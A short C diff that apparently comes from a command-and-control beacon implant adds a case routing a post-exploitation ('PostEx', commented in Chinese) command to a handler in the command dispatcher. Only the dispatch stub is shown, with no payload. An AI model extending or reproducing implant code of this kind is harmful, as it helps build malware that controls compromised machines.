@@ -167,6 +167,11 @@ PacketList CommandDispatch(BeaconContext* ctx, UINT32 task_id, UINT32 command_id
         PlistAdd(&out, CascadeHandleClose(ctx, &p));
         break;
 
+    /* PostEx 子协议 */
+    case BEACON_COMMAND_POSTEX:
+        PlistAdd(&out, PostExHandle(ctx, task_id, &p));
+        break;
+
     /* 未知命令 */
     default:
         {
